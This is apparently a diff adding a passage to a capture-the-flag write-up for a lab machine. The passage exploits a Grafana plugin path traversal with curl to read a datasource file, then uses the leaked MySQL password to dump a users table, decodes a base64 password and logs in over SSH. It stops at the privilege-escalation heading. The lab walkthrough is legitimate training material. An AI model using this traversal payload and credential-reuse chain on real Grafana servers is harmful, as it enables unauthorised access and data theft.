@@ -431,3 +431,169 @@ admin_password = messageInABottle685427
 ```
 
 <br />
+
+We log in to Grafana with the credential but we don't see anything interesting so we keep listing files.
+
+<br />
+
+## mysql.yaml (etc/grafana/provisioning/datasources/mysql.yaml):
+
+<br />
+
+Another interesting file is mysql.yaml, since in this type of file we can find credentials for a database.
+
+We list the file:
+
+<br />
+
+```bash
+
+❯ curl -s -X GET "http://10.10.11.183:3000/public/plugins/welcome/../../../../../../../../../../../../../etc/grafana/provisioning/datasources/mysql.yaml" --path-as-is
+apiVersion: 1
+
+datasources:
+ - name: mysql.yaml 
+   type: mysql
+   host: localhost
+   database: grafana
+   user: grafana
+   password: dontStandSoCloseToMe63221!
+   editable: false
+```
+
+<br />
+
+We have another password!! It seems to be mysql's.
+
+<br />
+
+# Mysql Database Enumeration:
+
+<br />
+
+Log in with the new password into the database remotely:
+
+<br />
+
+```bash
+❯ mysql -h 10.10.11.183 -u grafana -pdontStandSoCloseToMe63221!
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MySQL connection id is 15
+Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MySQL [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| grafana            |
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
+| whackywidget       |
++--------------------+
+6 rows in set (0,134 sec)
+```
+
+<br />
+
+Looking in whacky widget there’s only one table:
+
+<br />
+
+```bash
+MySQL [(none)]> use whackywidget;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MySQL [whackywidget]> show tables;
++------------------------+
+| Tables_in_whackywidget |
++------------------------+
+| users                  |
++------------------------+
+1 row in set (0,041 sec)
+```
+
+<br />
+
+We list the contents of the table and boom! We have a base64 credential for the user developer:
+
+<br />
+
+```bash
+MySQL [whackywidget]> select * from users;
++-----------+------------------------------------------+
+| user      | pass                                     |
++-----------+------------------------------------------+
+| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
++-----------+------------------------------------------+
+1 row in set (0,043 sec)
+```
+
+<br />
+
+Apply a decode and try to log in via ssh to the Victim Machine as this user:
+
+<br />
+
+```bash
+❯ echo -n 'YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==' | base64 -d
+anEnglishManInNewYork027468
+❯ ssh developer@10.10.11.183
+developer@10.10.11.183's password: 
+Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat 04 Jan 2025 01:00:30 PM UTC
+
+  System load:           0.01
+  Usage of /:            80.9% of 5.07GB
+  Memory usage:          39%
+  Swap usage:            0%
+  Processes:             229
+  Users logged in:       0
+  IPv4 address for eth0: 10.10.11.183
+  IPv6 address for eth0: dead:beef::250:56ff:fe94:166b
+
+ * Super-optimized for small spaces - read how we shrank the memory
+   footprint of MicroK8s to make it the smallest full K8s around.
+
+   https://ubuntu.com/blog/microk8s-memory-optimisation
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Sat Jan  4 13:00:20 2025 from 10.10.14.13
+developer@ambassador:~$ export TERM=xterm
+developer@ambassador:~$ cd /home/developer/
+developer@ambassador:~$ cat user.txt
+63905ecc389385e918061739f4xxxxxx
+```
+
+<br />
+
+We're in!! Intrusion ready, let's go for the Privilege Escalation!!
+
+<br />
+
+# Privilege Escalation: developer -> root 
+
+<br />
+
+
+
+
